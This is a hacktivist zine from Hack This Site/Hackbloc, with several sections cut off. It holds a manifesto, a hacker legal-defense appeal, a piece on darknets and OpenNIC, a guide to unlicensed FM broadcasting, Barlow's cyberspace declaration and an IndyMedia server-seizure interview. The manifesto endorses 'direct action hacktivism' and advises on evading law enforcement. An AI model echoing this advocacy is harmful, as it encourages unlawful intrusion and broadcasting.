Electronic\r\ncopies of the zine are available in a variety of formats on our website. Please\r\ndistribute to various file sharing services, text file collections, etc.\r\n\r\nGraphical PDF file: the complete magazine with complete graphical layout, ideal\r\nfor printing additional copies of the zine. See the Do It Yourself Distro below\r\nfor additional printing instructions.\r\n\r\nRaw .TXT file: ideal for lynx users or\r\nquick and speedy distribution in file sharing services, BBSs, through email,\r\netc.\r\n\r\nForums: Most of the articles in this zine are available at the zine forums\r\non our website in TXT format, where people can add comments. \r\n\r\nDO IT YOURSELF DISTRO! \r\n-------------------------------------------------------------------------------- \r\nWe've received countless stories of HTS people reprinting copies of the zine on\r\ntheir own and giving it away to everyone they know - at school, work, 2600\r\nmeetings, etc. Now's your chance to do the same. All you need is access to some\r\nprinter and PDF copies of the zine.\r\n\r\nThere are two files for the zine: one is the color cover and the other is the\r\nblack and white inside pages. It is formatted double sided so that when printed\r\nit can simply be folded in half. If you are using a printer that can only print\r\nin single sides, print with one sheet of paper, turn it around and print the\r\nsecond page on the other side repeating for the remaining pages.\r\n\r\nThe cover PDF file is high resolution color and ideally would be best printed on\r\nglossy color paper. But if all you have is black and white, then go with it! \r\n\r\nAssemble the printed pages and use a long style stapler to bind them together.\r\nThey have these available at universities, copy shops, art and craft stores,\r\netc.\r\n\r\nIf you are distributing copies(especially outside the U.S) and want to make them\r\navailable to others, let us know so we can announce your information to the Get\r\nLocal section of the zine website. \r\n\r\nGet Involved with Hack This Site\r\n--------------------------------------------------------------------------------\r\nThis movement is entirely what you make of it.

But globalizing a good thing is usually good. Cooperation and\r\nsharing of knowledge are good, and when they happen globally, they are even\r\nbetter. The kind of globalization there are demonstrations against is the\r\nglobalization of business power.

As a scavanger\r\nof information shards, smuggler, blackmailer, perhaps even cyberterrorist, the\r\nTAZ-hacker will work for the evolution of clandestine fractal connections. These\r\nconnections, and the different information that flows among and between them,\r\nwill form \"power outlets\" for the coming-into-being of the TAZ itself-as if one\r\nwere to steal electricity from the energy-monopoly to light an abandoned house\r\nfor squatters.\" - Hakim Bey, Temporary Autonomous Zone\r\n                             \r\n[------------------------------------------------------------------------------]\r\n[ hackers, crackers, artists & anarchists ........................... hackbloc ]\r\n[------------------------------------------------------------------------------]\r\n\r\nWe started the Hack This Site project to spread the idea that information\r\ndemands to be free and by providing hackers with hands on training we could show\r\npeople how to use their skills for positive uses of free technology. After\r\nmeeting up with others who were working on similar projects and realizing how\r\npeople were inspired to turn skills to action from the first few zines we\r\nreleased, we decided to get together and start Hackbloc.\r\n\r\nHackbloc are local gatherings of with hackers and activists to share skills, an\r\naffinity group of hacktivists, and a tactic at protests and other actions. We\r\nact to defend a free internet and a free society by mixing hacker and activist\r\nstrategies to explore both defensive hacktivism (defending free internet and\r\nopen publishing systems) and direct action hacktivism (actions against corrupt\r\ncorporations, governments and other forms of fascism). Hackbloc is a\r\ndecentralized network of cells which collaborate and coordinate actions in\r\nsolidarity with other social justice struggles around the world.\r\n\r\nWe met up at various actions and gatherings around the country to share and\r\nnetwork with other hackers and activists. We handed out underground hacker\r\nmagazines at guerrilla tables at DEFCON. We have had several workshops and\r\nparties in Chicago where dozens of hackers around the region got together to\r\nplay wargames, pick locks, swap code, and otherwise plot for future projects and\r\nactions. We got together to hold huge protests in both DC and San Francisco for\r\nthe World Bank / IMF meetings where several hundred thousand people gathered for\r\nanti-war and anti-capitalists protests. The more we started coordinating our\r\nactions with others who were working on similar projects, the more we began to\r\nrealize how different struggles all over the world are connected. \r\n\r\nBattles in the courtrooms over political and hacker arrests and investigations\r\nof multiple people all over the world provide valuable lessons for those\r\nconsidering getting involved, playing the game, and organizing online\r\ncommunities. In order to be safe and effective, we need to practice good\r\nsecurity culture by working only with trusted people in tight decentralized\r\naffinity groups, maintain a mainstream front to recruit people for side\r\nprojects, and work to settle differences between potential allies and unite for\r\nthe greater good. \r\n\r\nAs people who can see beyond and create alternatives to corrupt systems, hackers\r\nare in a unique position to confront and fight the forces which attack digital\r\nrights and a free internet. Independent media, free technology and\r\nnon-commercial internet creates temporary autonomous zones where an underground\r\nnetwork of hackers who's duty and responsibility includes training each other to\r\nconfront and fight these injustices - to defend hackers facing jailtime, expose\r\ncorporate and government corruption, find alternatives to commercial software,\r\nshare knowledge and talk tactics with potential allies.\r\n\r\nWe are not the violent, destructive madmen that law enforcement and the media\r\npaints us as. We work to build a free internet and a free world and we refuse to\r\nbe bullied by right wing extremists, white hat sellouts, or law enforcement who\r\nstand in the way. Hacktivists of the world, unite!\r\n\r\n--\r\n\r\n\"The FBI COINTELPRO program was initiated in 1956. Its purpose, as described\r\nlater by FBI Director J. Edgar Hoover, was \"to expose, disrupt, misdirect,\r\ndiscredit, or otherwise neutralize activities\" of those individuals and\r\norganizations whose ideas or goals he opposed. Tactics included: falsely\r\nlabelling individuals as informants; infiltrating groups with persons instructed\r\nto disrupt the group; sending anonymous or forged letters designed to promote\r\nstrife between groups; initiating politically motivated IRS investigations;\r\ncarrying out burglaries of offices and unlawful wiretaps; and disseminating to\r\nother government agencies and to the media unlawfully obtained derogatory\r\ninformation on individuals and groups.\"\r\n\r\nWe are facing unprecedented police state measures which specifically target\r\nactivists and hackers. In the name of national security, federal law enforcement\r\nhas been spying on, targetting, and harassing activists including anti-war,\r\nanimal rights, and earth first and other protest groups. Whether they take on\r\nthe form of the USA Patriot Act, expanded Homeland Security powers, Total\r\nInformation Awareness, enemy combatants, military tribunals, or Bush personally\r\nauthorizing the NSA to spy on Americans without court orders and warrants, these\r\nactions reveal a pattern of abuse and the transition to a neo-fascist police\r\nstate which treats hackers and activists as terrorists. When an administration\r\nbreaks the law and walks all over the constitution, it is time for a regime\r\nchange.\r\n\r\n[------------------------------------------------------------------------------]            \r\n[ support hairball against unjust felony charges ...... hacker defense network ]\r\n[------------------------------------------------------------------------------]\r\n\r\nFederal prosecuters are accusing Michael Wally(known as \"Hairball\") of\r\nPittsburgh of 'stealing' and distributing 37,000 free phone cards from an online\r\ngiveaway, citing damages at over $333,000. As of this writing, the US Attorney\r\nis offering Hairball a deal where he would plead guilty to felony wire fraud and\r\nserve up to three years in jail. \r\n\r\nFolgers.com was giving away free 30 minute phone cards on it's website as part\r\nof an online promotion to people who filled out a quick survey. Allegedly,\r\nHairball found a way to automate the process and get lists of free phone cards.\r\nWhat is unclear about these accusations is whether this is an actual criminal\r\noffense or simply a violation of Folger's terms of service agreement(a civil\r\ncase). \r\n\r\nHairball, having started HBX Networks, was a popular target of cyber-crime\r\nauthorities. HBX has started a number of computer hacking projects, including\r\nthe free shell project, the HAXOR radio show, wardialing projects, a bustling\r\nIRC server, and more. Hairball has contributed positively to the hacking\r\ncommunity, but has fallen victim to unjust prosecution with overblown\r\nsentencing.\r\n\r\nAs part of a new trend in cyber crime and law enforcement, hackers and activists\r\nare treated like terrorists and are often subject to illegal surveillance and\r\nunjust investigation, prosecution, and sentencing. Robert Erdley of the\r\nPittsburgh High Tech Crimes Task Force has personally raided and arrested\r\nHairball multiple times, including an earlier incident in late August 2004\r\nrelating to HBX's wardialing project. His case has since been passed on to\r\nfederal authorities, and is now facing several years in jail and large\r\nrestitutions for hurting or stealing from nobody.\r\n\r\nHairball has always worked to defend free technology and has inspired a number\r\nof people to learn about computers and hacking. If Hairball goes to jail, a\r\ngreat crime will have been committed against the hacking community by\r\nreactionary federal prosecutors. We need to stick together to defend our\r\ncomrades facing jailtime and write letters, make phone calls, and otherwise\r\nspread the word about unjust hacker prosecution.\r\n\r\nTHEY'RE IN THERE FOR US, WE'RE OUT HERE FOR THEM\r\n\r\nHackers considering starting a Hacker Defense Network should check out various\r\nprison support networks for setting up legal support. \r\n\r\nwww.prisonactivist.org www.spiritoffreedom.org.uk www.anarchistblackcross.org\r\nwww.abcf.net  www.booksnotbars.org  www.prisonbookprogram.org  \r\n\r\n.--------------------------------------------------------------------.\r\n| Session Start: Friday, 4 February 2005                             |\r\n| Participants:                                                      |\r\n|    narc (narc@narc.net)                                            |\r\n|    Kfir (kfiralfia@hotmail.com)                                    |\r\n.--------------------------------------------------------------------.\r\n[07:24:40 PM] Kfir: hello there.\r\n[07:25:09 PM] narc: hi.

An ever-growing number of darknets and other models of\r\ncontent distribution have been created using file sharing services such as\r\nGnutella and BitTorrent, open publishing systems such as IndyMedia and Wiki, and\r\nopen DNS systems such as OpenNIC and Afraid.org. These DIY networks cannot be\r\nbought, sold, or otherwise controlled and are unstoppable weapons which will not\r\nonly make copyright and commercial internet irrelevant, but pave the way to\r\ndeveloping entirely new networks, pirate utopias based on an open source\r\nanarchist approach towards the free exchange of information.\r\n\r\n\"Quantity and quality of P2P technologies are inversely proportional  \r\nto the numbers of lawsuits issued to stop P2P\" - 3rd Monty's Law\r\n\r\n--\r\nGross privacy violations are a small part of fundamental problems with how ICANN\r\nis structured. In a paper published at kuro5hin.org, \"An Immodest DNS Proposal\"\r\noutlines the broader problems with ICANN's DNS model:\r\n\r\n* DNS is centrally controlled by an organization (ICANN) whose primary interest\r\nis supporting business, rather than in maintaining and improving the system\r\nitself and whose primary claim to legitimacy is through delegation by a single\r\ncountry's government (USA).\r\n\r\n* The system is managed by a single for-profit corporation (NSI), which is bad\r\nenough but registrations are managed by many competing for-profit corporations.\r\nNSI is also primarily legitimized by delegation from a single government (USA\r\nagain, naturally).\r\n\r\n* The Intellectual Property laws of a single country (there's the USA again) are\r\nbeing used inappropriately to control the activities of users in non-commercial\r\nparts of the Net (corporate control of the .net and .org domain trees through US\r\nTrademark law) and in other countries.\r\n--\r\n\r\nOpen publishing systems such as the IndyMedia allows people to post\r\nannouncements freely and become the media. IndyMedia is a decentralized network\r\nof media collectives found in most major cities around the world that allow\r\npeople to post announcements, update fliers, and otherwise tune in to the\r\nhappenings of the area. There are several flavors of IMC software including\r\nsfactive, mir, and dadaimc - all of which have advantages and disadvantages.\r\nIndyMedia software is generally open source and people can and do set up their\r\nown IMC collectives with minimal effort. Wiki open publishing software has\r\nbecoming increasingly popular over the past few years. Sites with Wiki allow\r\npeople to create and modify all pages in the index, and instead of resulting\r\nwith chaos and confusion, services like Wikipedia.org have become wildly\r\nsuccessful.\r\n\r\nPeer to peer file sharing services open whole new worlds where we can\r\ncommunicate and collaborate at an accelerated rate, where creativity isn't\r\ninhibited by such artificialities as copyright laws and property rights. Moving\r\nwell beyond centralized systems such as Napster, technology like BitTorrent,\r\nGnutella, FastTrack, eDonkey, and countless others have created networks\r\nindependent of centralized servers allowing people to share files and write\r\ntheir own clients for these protocols. Our success with these services are\r\nindicated by how frightened the commercial industry is getting and how desperate\r\nand ineffectual their attempts to shut down these services through legal means.\r\nWhen one service shuts down, another three spring up even more decentralized and\r\nanonymous than before.\r\n\r\nIn addition to providing free dynamic DNS services, Afraid.org has also set up a\r\nsystem where domains can be made public and shared with other users on the\r\ninternet. People can register domains, point them to afraid.org's DNS servers,\r\nand make them 'public' - allowing others to register their own subdomains and\r\nhave them point to their own servers. There are thousands of public domains that\r\npeople can already start using.\r\n\r\n--\r\n\r\nICANN and Alternatives to Commercial DNS\r\nSince ICANN policy is now requiring valid public contact information, many\r\ndomain names which host controversial content including dissident or\r\nwhistleblowing services have had to choose to give up their name, email, phone\r\nnumber, and address or face being shut down. Several domains we run including\r\nHack This Site, Hacktivist.net, FreeJeremy.com and Prole.info were all targetted\r\nand shut down without any warning, taking weeks for them to respond to us faxing\r\nin copies of our drivers license, phone bills, and other documentation\r\nconfirming our true information. This new policy is an obscene violation of our\r\nprivacy and is a threat to dissident or whistleblowing groups.\r\n\r\nIn the resulting discussions, the OpenNIC project was created to be a \"user\r\nowned and controlled Network Information Center offering a democratic,\r\nnon-national, alternative to the traditional Top-Level Domain registries\". Users\r\ncan jump on this network by adding an OpenNIC DNS server to their system\r\nconfiguration.\r\n\r\nOpenNIC is non-profit and structured in a democratic way, with elected\r\nadministrators and public ballots for new policies, also giving the ability for\r\npeople to start their own top level domains (such as .indy, .geek, .null, .oss,\r\nand .parody) The idea is to be non-profit, democratic, and allow people to\r\ncreate and manage their own top level domains.\r\n\r\nAs long as we are communicating through commercial ISPs, we subject ourselves to\r\nnetworks which can be easily monitored and controlled. Even though we can\r\ndevelop all sorts of ways of sliding in and out of these systems securely, we\r\nare still reliant on internet infrastructure that is owned and run by\r\ncorporations and government. We need to be come used to the idea of \r\n\r\nThe Guerrilla.Net project proposes setting up an alternative network of open\r\nwifi nodes. Encryption and anonyminity is integrated at a router level, also\r\ncreating the ability to establish secure tunnels to the 'real' internet. The\r\nidea is to set up a decentralized network of wifi cells run by entirely\r\nnon-profit groups using open standards.\r\n\r\n--\r\n\"There is evidence that the darknet will continue to exist and provide low cost,\r\nhigh-quality service to a large group of consumers. This means that in many\r\nmarkets, the darknet will be a competitor to legal commerce. From the point of\r\nview of economic theory, this has profound implications for business strategy:\r\nfor example, increased security may act as a disincentive to legal commerce.\"\r\n--\r\n\"As pressure is asserted upon the Internet from insecure individuals in various\r\nWorld Governments, an alternative network is needed to insure that the free flow\r\nof information is not obstructed, captured, analyzed, modified, or logged. This\r\nis the main purpose of guerrilla.net. To provide a networking fabric outside of\r\nGovernments, commercial Internet service providers, telecommunications\r\ncompanies, and dubius Internet regulatory bodies. The free flow of private\r\ninformation is a REQUIREMENT of a free society.\"\r\n(guerrilla.net)\r\n--\r\nTo help with the OpenNIC project, set up your computer(and convince your ISP) to\r\nuse the additional OpenNIC DNS servers and sign up on the mailing list to keep\r\nup and contribute to the project. Some people have also suggested the idea of\r\nhaving \"OpenDNS Day\", where for one day out of the month people would have their\r\nservers configured to disallow connections from ICANN requests, encouraging\r\npeople to set up OpenNIC on their machines.\r\n\r\nOpenNIC DNS servers are split into three tiers: the first two tiers are for\r\ninternal synchronization purposes while the third tier are end-user servers\r\nwhich you can add to your network settings to hop on the entwork.\r\n\r\nTier 0:\r\nns0.opennic.glue (opennic.glue; Oakland, CA, US) - 131.161.247.232\r\n\r\nTier 1\r\nns1.opennic.glue (.oss; San Jose, CA, US) - 208.185.249.250\r\nns4.opennic.glue (.oss; San Jose, CA, US) - 208.185.249.251\r\nns8.opennic.glue (.parody; US) - 65.243.92.254\r\nns10.opennic.glue (.indy; Dallas, TX, US ) - 66.227.42.140\r\nns11.opennic.glue (.indy; Dallas, TX, US ) - 66.227.42.149\r\nns12.opennic.glue (.fur, .geek; Garden Grove, CA, US ) - 64.81.44.251\r\n\r\nTier 3:\r\nns1.de.opennic.glue (Cologne, DE) - 217.115.138.24\r\nns1.jp.opennic.glue (Tokyo, JP) - 219.127.89.34\r\nns2.jp.opennic.glue (Tokyo, JP) - 219.127.89.37\r\nns1.nz.opennic.glue (Auckland, NZ) - 202.89.131.4\r\nns1.uk.opennic.glue (London, UK) - 194.164.6.112\r\nns1.phx.us.opennic.glue (Phoenix, AZ, US) - 63.226.12.96\r\nns1.sfo.us.opennic.glue (San Francisco, CA, US) - 64.151.103.120\r\nns1.co.us.opennic.glue (Longmont, CO, US) - 216.87.84.209\r\nns1.ca.us.opennic.glue (Los Angeles, CA, US) - 67.102.133.222\r\n--\r\n\r\n\r\n[------------------------------------------------------------------------------]\r\n[ hacktivism project introduction ............................................ ]\r\n[------------------------------------------------------------------------------]\r\n\r\nAs hacktivists, we encourage hackers to consider the social and political\r\nimplications of actions.

It has an oscillator, an audio input\r\nsection, a FM modulation section, a RF pre-amplification stage and an RF\r\namplified output stage and sometimes an RF filter stage. \r\n\r\nANTENNAS \r\nAn properly tuned (low VSWR) antenna, J-pole, 5/8ths wave vertical, 1/4 wave\r\ndipole, broadband etc. as high up as you can get it makes up for LOTS of power\r\nand is money and time WELL spent! \r\n\r\nAMPLIFIERS \r\nAmplifiers are pretty boring pieces of equipment. They amplify your measly\r\nlittle exciterÕs signals to levels that will deliver solid reception to your\r\nlistening audience. \r\n\r\nFILTERS \r\nThese devices are used to decrease the output of frequencies with which you are\r\nNOT broadcasting. These OTHER frequencies are known as harmonics and you donÕt\r\nwant any! Harmonics are your enemy! \r\n\r\nSWR METERS \r\nYou get what you pay for when you buy a VSWR meter. Cheap ones are worthless,\r\ntheyÕll lie and make you confident when you should be otherwise. Bird makes the\r\nBEST and they are expensive at $300+ US, however, Diawa, Diamond, Standard\r\nCommunications are all good, servicable units that you can trust and will last\r\nand last. \r\n\r\nDUMMY LOADS \r\nYouÕll have a perfect VSWR reading every time with a dummy load! No signal out\r\nbut what the hey! Easy to build a little one, pre-built ones can cost $30 - $100\r\nor so depending on the wattage it must handle.     \r\n\r\nTuning your antenna \r\nUsing a properly tuned antenna is essential for micropower broadcasting on the\r\nFM band. An antenna that is not properly tuned will not pass along your\r\ntransmitterÕs power as efficiently as it could and this leads to a general\r\ndegradation of signal coverage. \r\n\r\nETHICS: \r\nThe airwaves are a community property. One must always treat it \r\nas such, respecting the space of other stations, both commercial \r\nand micro. \r\n\r\nLOOKING FOR OPENINGS: \r\nAdmittedly, some parts of the country have no empty channels. Places like south\r\nFlorida, California, New York and Chicago are virtually crammed full of\r\nstations. For the rest of us, if we look hard, we can locate one or more unused\r\nchannels. \r\n\r\nONCE YOU DECIDE \r\nYouÕve located a channel thatÕs clear and has no strong nearby adjacents\r\nbroadcasting. \r\n1. Educate yourself about radio theory. Buy the Radio AmateurÕs Handbook and\r\nstudy it. \r\n2. YouÕll need some essential tools to avoid working blind. You should have an\r\noscilloscope with at least a 100Mhz bandwidth so you can see what your carrier\r\nlooks like and if the device is operating incorrectly, causing parasitic\r\noscillation. You should have a good stable frequency counter that has at least a\r\n10 ppm accuracy and resolution to 1hz at 100Mhz. A good Volt-Ohmmeter for\r\ngeneral measurements of voltages and resistance. \r\n\r\nA SWR impedance analyzer bridge (MFJ Enterprises makes an affordable unit, model\r\nMFJ259, which combines a frequency counter, R.F. signal generator, SWR meter and\r\nresistance meter in one versatile unit). \r\n\r\nESSENTIAL COMPONENTS OF A STATION \r\nThe main transmitter. A unit that is crystal-controlled and/or PLL synthesized,\r\nusing varactor diode tuning and modulation methods. A broadcast limiter. Stereo,\r\nif you have a stereo generator. This is essential to insure non-interference to\r\nadjacent channels and maintain maximum volume without overmodulating. Setting\r\nyour modulation levels.\r\n\r\n  * An SWR/Power Meter to monitor the condition of your antenna system. \r\n  * A mixing board to act as your program control center. \r\n  * Audio sources to provide program material. \r\n  * A good microphone. \r\n\r\nOptionally, if you broadcast in stereo, youÕll need to add the fol- \r\nlowing: \r\n\r\n  * A multiplex ÒstereoÓ generator.  \r\n  * Two-channel broadcast limiter. \r\n\r\nAll components back to the studio should be stereo capable. \r\n\r\nThe original version of this article was written by EvilDeshi although to fit\r\nthe article onto this single page we needed to water down the content alot but\r\nyou can read the full article at: http://wickedradio.org/radio.rtf \r\n\r\n[------------------------------------------------------------------------------]\r\n[ declaration of the independence of cyberspace ....... john barlow of the EFF ]\r\n[------------------------------------------------------------------------------]\r\n\r\nGovernments of the Industrial World, you weary giants of flesh and steel, I come\r\nfrom Cyberspace, the new home of Mind. On behalf of the future, I ask you of the\r\npast to leave us alone. You are not welcome among us. You have no sovereignty\r\nwhere we gather.\r\n\r\nWe have no elected government, nor are we likely to have one, so I address you\r\nwith no greater authority than that with which liberty itself always speaks. I\r\ndeclare the global social space we are building to be naturally independent of\r\nthe tyrannies you seek to impose on us. You have no moral right to rule us nor\r\ndo you possess any methods of enforcement we have true reason to fear.\r\n\r\nGovernments derive their just powers from the consent of the governed. You have\r\nneither solicited nor received ours. We did not invite you. You do not know us,\r\nnor do you know our world. Cyberspace does not lie within your borders. Do not\r\nthink that you can build it, as though it were a public construction project.\r\nYou cannot. It is an act of nature and it grows itself through our collective\r\nactions.\r\n\r\nYou have not engaged in our great and gathering conversation, nor did you create\r\nthe wealth of our marketplaces. You do not know our culture, our ethics, or the\r\nunwritten codes that already provide our society more order than could be\r\nobtained by any of your impositions.\r\n\r\nYou claim there are problems among us that you need to solve. You use this claim\r\nas an excuse to invade our precincts. Many of these problems don't exist. Where\r\nthere are real conflicts, where there are wrongs, we will identify them and\r\naddress them by our means. We are forming our own Social Contract. This\r\ngovernance will arise according to the conditions of our world, not yours. Our\r\nworld is different.\r\n\r\nCyberspace consists of transactions, relationships, and thought itself, arrayed\r\nlike a standing wave in the web of our communications. Ours is a world that is\r\nboth everywhere and nowhere, but it is not where bodies live.\r\n\r\nWe are creating a world that all may enter without privilege or prejudice\r\naccorded by race, economic power, military force, or station of birth.\r\n\r\nWe are creating a world where anyone, anywhere may express his or her beliefs,\r\nno matter how singular, without fear of being coerced into silence or\r\nconformity.\r\n\r\nYour legal concepts of property, expression, identity, movement, and context do\r\nnot apply to us. They are based on matter, There is no matter here.\r\n\r\nOur identities have no bodies, so, unlike you, we cannot obtain order by\r\nphysical coercion. We believe that from ethics, enlightened self-interest, and\r\nthe commonweal, our governance will emerge. Our identities may be distributed\r\nacross many of your jurisdictions. The only law that all our constituent\r\ncultures would generally recognize is the Golden Rule. We hope we will be able\r\nto build our particular solutions on that basis. But we cannot accept the\r\nsolutions you are attempting to impose.\r\n\r\nIn the United States, you have today created a law, the Telecommunications\r\nReform Act, which repudiates your own Constitution and insults the dreams of\r\nJefferson, Washington, Mill, Madison, DeToqueville, and Brandeis. These dreams\r\nmust now be born anew in us.\r\n\r\nYou are terrified of your own children, since they are natives in a world where\r\nyou will always be immigrants. Because you fear them, you entrust your\r\nbureaucracies with the parental responsibilities you are too cowardly to\r\nconfront yourselves. In our world, all the sentiments and expressions of\r\nhumanity, from the debasing to the angelic, are parts of a seamless whole, the\r\nglobal conversation of bits. We cannot separate the air that chokes from the air\r\nupon which wings beat.\r\n\r\nIn China, Germany, France, Russia, Singapore, Italy and the United States, you\r\nare trying to ward off the virus of liberty by erecting guard posts at the\r\nfrontiers of Cyberspace. These may keep out the contagion for a small time, but\r\nthey will not work in a world that will soon be blanketed in bit-bearing media.\r\n\r\nYour increasingly obsolete information industries would perpetuate themselves by\r\nproposing laws, in America and elsewhere, that claim to own speech itself\r\nthroughout the world. These laws would declare ideas to be another industrial\r\nproduct, no more noble than pig iron. In our world, whatever the human mind may\r\ncreate can be reproduced and distributed infinitely at no cost. The global\r\nconveyance of thought no longer requires your factories to accomplish.\r\n\r\nThese increasingly hostile and colonial measures place us in the same position\r\nas those previous lovers of freedom and self-determination who had to reject the\r\nauthorities of distant, uninformed powers. We must declare our virtual selves\r\nimmune to your sovereignty, even as we continue to consent to your rule over our\r\nbodies. We will spread ourselves across the Planet so that no one can arrest our\r\nthoughts.\r\n\r\nWe will create a civilization of the Mind in Cyberspace.

We interviewed him\r\nregarding the server seizures, how hackers can work to protect open publishing\r\nsystems such as IndyMedia, and how hackers are becoming more radicalized and\r\ninvolved with social justice struggles. This interview is being streamed as part\r\nof the new website http://www.Hacktivist.net. \r\n\r\nListen to the interview via MP3: http://www.hacktivist.net/radio/ukindymedia.mp3\r\n\r\nJeremy: This is Jeremy from HackThisSite.org and I'm sitting in the room with\r\nseveral people who are loosely affiliated with our website as well as someone\r\nwho is on the UK IndyMedia project. We have a few things we'd like to talk about\r\nlike how to protect open publishing systems such as IndyMedia, how to configure\r\nour servers in such a way that makes us less liable, and how hackers can play a\r\nmore integral role in defending open publishing systems. Other people are going\r\nto introduce themselves right now:\r\n\r\nUK: Hello this is ..... from the UK and I'm from UK IndyMedia\r\n\r\nAlx: This is Alxciada from HTS\r\n\r\nGary: This is Gary Naham, an activist in Chicago hoping to becoming a hacktivist\r\ndedicated to seeing government systems that survive and respect the digital\r\nevolution of technology and not interfere\r\n\r\nJeremy: We have a few things we'd like to talk about specifically about how\r\nhackers can play a more integral role and help work with various media\r\ncollectives, but we'd also like afterwards talk in general about IndyMedia, free\r\nspeech, open publishing systems, p2p file sharing systems, and how hackers can\r\nwork together with people to help pressure and change the law. For starters, why\r\ndon't you tell us a little bit about yourself, what sort of work you do, what\r\ngroups you work with in the past, how you help out?\r\n\r\nUK: A little about myself, well, by day an IT techie, by night an IT director I\r\nrun public internet, public internet is one of the hosting points indymedia uk,\r\nthe wiki server, and I kinda got involved when the server seizure happened about\r\n9-12 months ago, kinda became quite important to me that we brought em up as\r\nquickly as possible because the time we're down, we lose the chance to tell our\r\nside of the story so I put up one of our servers put a mirror off the publishing\r\nsite and we went from there.\r\n\r\nJeremy: Great. So right now you're currently working as IT director to help out\r\nwith configuring and setting up these servers when they go down?\r\n\r\nUK: Yeah that's right, let me quickly go over all the things I'm involved with.\r\nPrimarily I run a server mirroring the UK site. Additionally I set up rackspace\r\nfor some of the other indymedia projects that are currently going on. Current in\r\nthe process of trying to security data with what's going on in the world.\r\n\r\nJeremy: I understand that it is very vague about what the feds had been looking\r\nfor on these servers and there's some degree of confusion. Can you tell us any\r\ndetails about what sort of data or evidence they were looking for and how they\r\nexecuted the search?\r\n\r\nUK: From my understanding it wasn't actually the feds who were after the server.\r\nMy understanding is that it was a result of pressure by the Swiss and Italian\r\ngovernment relating to previous protests in Genoa and Niece, I believe those\r\nwere the two areas of interests. I believe photos were published which ...\r\nauthorities didn't like, and yeah, they were looking for server logs, they were\r\nlooking for IPs, now fortunately, our server doesn't log IPs!\r\n\r\n[Great! What a shame! Too bad!]\r\n\r\nJeremy: I heard the pictures that were posted were undercover police and they\r\nwere looking for the people who originally published them?\r\n\r\nUK: That's the Swiss connection I believe, however I think the Italian\r\ngovernment had a more general problem with IndyMedia - I met with the house I\r\nwonder if that's what that connection came from.\r\n\r\nJeremy: How could the Italian authorities pressure the British government to\r\nexecute this raid?\r\n\r\nUK: As I understand it, there's a mutual legal assistance treaty with Italy and\r\nthe US. Now Rackspace which previously hosted the UK server is a US company\r\nwhich therefore falls under US jurisdiction to a degree. Question not entirely\r\nlegal because the servers were hosted in the UK and rackspace has a legal entity\r\nin the UK, therefore, we believe it should have gone through due process in the\r\nUK who should have taken the servers - they didn't, that's what the line is at\r\nthe moment.\r\n\r\nJeremy: The hosting company itself gave the server up upon request by western\r\nauthorities?\r\n\r\nUK: I believe so, now this is one of the interesting things, and this ties back\r\nwith where we are today. Apparently, the servers weren't actually requested, the\r\nlogs were requested, and Rackspace went one step further. Rackspace effectively\r\nbent over and took it. They handed over the entire server system.\r\n\r\nJeremy: Wow.\r\n\r\nAlxciada: So they were originally coming for the logs.\r\n\r\nUK: Apparently so, that's what we're hearing, hopefully in the next few days we\r\nshould hear a little more about it. The EFF put enough pressure on the US side\r\nto get the papers.\r\n\r\nAlxciada: Was it United States federal agents that raided the server?\r\n\r\nUK: I believe so. I believe it was Rackspace employees that went in took the\r\nservers. The court orders that were filed were filed in Texas. The EFF basically\r\nwent through that and demanded the papers, and that's currently being sorted\r\nout, but hopefully we'll get a clear picture of what they were after.\r\n\r\nGary: Are there any areas of European or British security law that provides\r\ncoverage or at least an option of defending against this?\r\n\r\nUK: Oh, yes! Data protection acts alone should cover this kind of issue because\r\nthey effectively seized a server that hosted shitloads of different stuff. They\r\nwere after one very specific piece of information and in the process gathering\r\nlots of other shit so I imagine there are data protection acts that have bearing\r\non the case.\r\n\r\nGary: Are there legal remedies available to prosecute and affect authorities if\r\nthis is an extrajudicial action which is what it sounds like. \r\n\r\nUK: I'm not sure if anything is happening in the UK because unfortunately the UK\r\nEuropedoesn't have anything an EFF at this stage. It's one of the things that's\r\nbeing worked on talked about but it's never achieved fruition. Therefore we're\r\ndepending on a far wider group of individuals to help us out. Looking at people\r\nassociated with journalism, trade, privacy, etc. but there's no central group\r\nfor information privacy having to do with electronic\r\n\r\nGary: So European Data Security laws are even less protective than US security?\r\n\r\nUK: I think they are because it was the way the manuveur was pulled. We\r\neffectively never wet through anywhere nearthe UK system. If it went through the\r\nUK system it would be a long drawn out case there would have been pros and cons\r\nwe would have had our day in court. But because they went through a backdoor in\r\nthe US system - a loophole - it went past our security. \r\n\r\nGary: That the British were happy to allow?\r\n\r\nUK: I don't think the Brits had a whole lot to do with it. From our\r\nunderstanding Rackspace employees went into the server room yanked the servers.\r\n\r\nJeremy: They were originally were looking for a flat log file and the company\r\njust said \"I'm not gonna mess with this!\" and gave up the entire server?\r\n\r\nUK: As I understand it, yes\r\n\r\nJeremy: And there were a lot of other various websites and collectives on the\r\nserver?\r\n\r\nUK: Oh yes, there was everything from linux distros, to various indymedias,\r\npersonal sites - yeah, it hit a lot.\r\n\r\nGary: I would assume this is a violation Rackspace's contract with IndyMedia\r\nentities that have signed it?\r\n\r\nUK: Unfortunately the contract was with a single individual. Yes, there probably\r\nwas a contract violation there, but as I said, because it never touched UK\r\nauthorities, to drag it through the UK system there would be no point of - the\r\ncase would fall apart. Because it was in the US the case there was a actual case\r\nin the US going on, there is a lot easier to focus on.\r\n\r\nJeremy: Knowing what you know now about the corporate host and how they were so\r\nquick to give up everything and set back these various collectives, how would\r\nyou configure or structure these servers to make the system as a whole less\r\nliable?\r\n\r\nUK: Well it's very interesting and actually very simple. We drew a great big\r\ncircle around the biggest weakness: we had one server, we now have twelve.\r\n\r\n[laughter]\r\n\r\nUK: The content management system we use is very good, it's designed for\r\nmirroring. We've basically taken advatage of the way the CMS system was designed\r\nand used it to our advantage. The dynamics are the site are actually done from\r\nthe publish server and then the servers actually show the data. \r\n\r\nJeremy: So when you actually post something to UK IndyMedia it is actually\r\nmirrored to other servers all over the world?\r\n\r\nUK: And a variety of different operating systems. Our personal server w3.org is\r\na Solaris box. Others run debian, freebsd, fedora core - we have a nice\r\ncontingent of OSs so if a vulnerability breaks out - unless it's somethig inside\r\nthe publishing system itself - we should have a reasonable amount of resiliance.\r\n\r\nJeremy: This seems like a perfect example of how a decentralized model of\r\ncontent distribution can protect ourselves from not only legal subpoenas because\r\nit creates a aura of bureaucracy the courts have to go through but protect\r\nourselves from would-be hackers ...\r\n\r\nUK: Yes, definitely.\r\n\r\nGary: In an era of extrajudition proceedings where the authorities think they\r\ncan do anything they want and just present us with facts despite legal\r\nprotections that clearly exist in this case and were violated, I think you 